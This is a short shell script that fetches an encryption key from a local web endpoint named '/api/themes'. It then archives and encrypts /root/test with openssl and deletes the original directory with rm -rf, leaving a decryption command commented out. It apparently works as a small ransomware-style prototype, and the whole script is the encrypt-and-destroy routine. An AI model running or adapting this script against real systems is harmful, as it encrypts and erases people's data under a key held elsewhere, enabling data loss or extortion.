# /bin/sh

URL="http://localhost:3000/api/themes"

stat=$(curl -L -o /dev/null -s -w "%{http_code}\n" $URL)
if [ $stat -eq 200 ]; then
    echo "Server is up"
    ENCRYPTION_KEY=$(curl -L -4 $URL)
    tar -czf - /root/test | openssl enc -aes-256-cbc -e -k $ENCRYPTION_KEY -out /root/test.tar.gz.enc
    rm -rf /root/test
    # Then, decrypt and unzip it
    # openssl enc -aes-256-cbc -d -k $ENCRYPTION_KEY -in /root/test.tar.gz.enc | tar -xz -C /root/test
else
    echo "Server is down"
    exit 0
fi
